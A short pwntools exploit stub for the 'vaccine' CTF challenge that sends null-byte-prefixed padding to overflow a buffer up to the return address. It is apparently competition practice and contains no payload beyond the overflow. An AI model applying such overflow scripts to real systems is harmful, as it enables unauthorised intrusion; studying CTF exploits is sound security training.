#!/usr/bin/env python3
from pwn import *

exe = ELF("./vaccine")

context.binary = exe

p = process("./vaccine")
#gdb.attach(p)

# p = remote("vaccine.chal.ctf.acsc.asia", 1337)

get_to_ret = b"A"*4 + b"\x00" + b"A"*111

p.recvuntil(b"vaccine:")
p.sendline(get_to_ret)
p.interactive()
